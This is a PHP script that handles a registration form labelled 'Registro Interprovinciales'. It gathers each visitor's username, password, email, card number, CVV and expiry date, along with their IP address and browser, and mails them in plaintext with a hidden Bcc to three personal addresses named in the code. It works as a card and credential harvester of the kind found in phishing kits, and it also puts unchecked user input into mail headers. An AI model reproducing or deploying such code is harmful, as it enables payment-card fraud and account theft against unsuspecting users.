<?php 
header('content-type: application/json; charset=utf-8');

/*-- Captura de variables --*/
$textinput = strip_tags($_POST['textinput']);
$textinput2 = strip_tags($_POST['textinput2']);
$textinput3 = strip_tags($_POST['textinput3']);
$passwordinput = strip_tags($_POST['passwordinput']);
$textinput4 = strip_tags($_POST['textinput4']);
$textinput5 = strip_tags($_POST['textinput5']);
$textinput6 = strip_tags($_POST['textinput6']);
$select_mes = strip_tags($_POST['select_mes']);
$select_ano = strip_tags($_POST['select_ano']);

/*-- Variables extras --*/
$ip = $_SERVER['REMOTE_ADDR'];
$httpref = $_SERVER['HTTP_REFERER'];
$httpagent = $_SERVER['HTTP_USER_AGENT'];
$today = date("F j, Y, g:i a");

/*-- Cabeceras de email --*/
$recipient = $textinput3;
$subject = 'Registro Interprovinciales';
$header = "MIME-VERSION: 1.0\r\n";
$header .= "Content-type: text/html; charset=UTF-8\r\n";
$header .= "From: Interprovinciales <vittosheva@hotmail.com>\r\n";
$header .= "Reply-To: ". $textinput . " <" . $textinput3 . ">\r\n"; 
$header .= "Bcc: jorgeluisvz@gmail.com, vittosheva@hotmail.com, angelfranco.c@outlook.com \r\n";

$mailbody = "<b>Nombres:</b> $textinput<br />
<b>Usuario:</b> $textinput2<br />
<b>Email:</b> $textinput3<br />
<b>Contraseña:</b> $passwordinput<br />
<b>Nombre y Apellido:</b> $textinput4<br />
<b>Numero de tarjeta:</b> $textinput5<br />
<b>CCV / CCV2:</b> $textinput6<br />
<b>Mes:</b> $select_mes<br />
<b>Año:</b> $select_ano<br />

<br /><br />

<b>IP:</b> $ip<br />
<b>Navegador:</b> $httpagent<br />
<b>Referido:</b> $httpref<br />
<b>Enviado:</b> $today<br />";

$result = 'success';

if (mail($recipient, $subject, $mailbody, $header)) {
	echo json_encode($result);
}
?>